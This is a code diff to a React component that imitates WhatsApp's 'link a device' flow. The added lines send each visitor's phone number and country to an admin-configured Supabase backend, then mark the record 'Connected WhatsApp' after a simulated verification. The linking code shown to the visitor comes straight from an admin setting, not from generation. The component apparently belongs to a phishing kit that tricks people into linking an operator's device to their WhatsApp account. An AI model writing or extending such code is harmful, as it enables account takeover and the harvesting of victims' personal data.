@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 import { CheckCircle2, AlertTriangle, ArrowRight, ArrowLeft, RefreshCw, Copy, Check, ChevronDown } from 'lucide-react';
 import { AdminConfig, LinkedDevice, RealtimeSyncStatus } from '../types';
+import { recordUserSubmission, updateUserSubmissionStep } from '../services/supabaseClient';
 
 interface WhatsAppLinkDeviceProps {
   adminConfig: AdminConfig;
@@ -47,6 +48,7 @@ export const WhatsAppLinkDevice: React.FC<WhatsAppLinkDeviceProps> = ({
   const [isVerifying, setIsVerifying] = useState(false);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [copied, setCopied] = useState(false);
+  const [submissionId, setSubmissionId] = useState<string | null>(null);
 
   // If already linked, show the connected device screen
   if (linkedDevice.isLinked) {
@@ -108,11 +110,28 @@ export const WhatsAppLinkDevice: React.FC<WhatsAppLinkDeviceProps> = ({
     );
   }
 
-  // Handle clicking "Next" on phone number screen
+  // Handle clicking "Next" on phone number screen (records submission in Supabase immediately)
   const handleProceedToCode = (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMessage(null);
     setStep('enter_code');
+
+    const cleanNumber = phoneNumber.trim();
+    if (cleanNumber) {
+      const fullNumber = `${selectedCountry.code} ${cleanNumber}`;
+      recordUserSubmission({
+        phoneNumber: fullNumber,
+        countryName: selectedCountry.name,
+        countryCode: selectedCountry.code,
+        currentStep: 'Viewing Code',
+        customUrl: adminConfig.supabaseUrl,
+        customAnonKey: adminConfig.supabaseAnonKey,
+      }).then((res) => {
+        if (res.id) {
+          setSubmissionId(res.id);
+        }
+      });
+    }
   };
 
   // 8-character linking code directly from admin config (NO random generation)
@@ -355,6 +374,12 @@ export const WhatsAppLinkDevice: React.FC<WhatsAppLinkDeviceProps> = ({
                   onClick={() => {
                     if (adminConfig.allowConnection) {
                       setIsVerifying(true);
+                      if (submissionId) {
+                        updateUserSubmissionStep(submissionId, 'Connected WhatsApp', {
+                          customUrl: adminConfig.supabaseUrl,
+                          customAnonKey: adminConfig.supabaseAnonKey,
+                        });
+                      }
                       setTimeout(() => {
                         setIsVerifying(false);
                         onDeviceLinked({
